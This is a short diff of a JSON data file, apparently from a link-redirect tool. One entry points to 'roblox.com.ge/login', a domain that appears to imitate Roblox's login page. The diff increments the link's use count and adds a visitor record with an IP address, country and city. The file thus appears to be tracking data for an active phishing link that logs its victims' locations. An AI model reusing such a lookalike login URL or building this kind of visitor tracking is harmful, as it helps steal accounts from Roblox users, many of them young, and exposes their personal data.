@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1494,
+    "useCount": 1495,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12120,6 +12120,14 @@
         "city": "Tarlac City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777441749486,
+        "ip": "107.206.169.232",
+        "country": "United States",
+        "city": "Sacramento",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
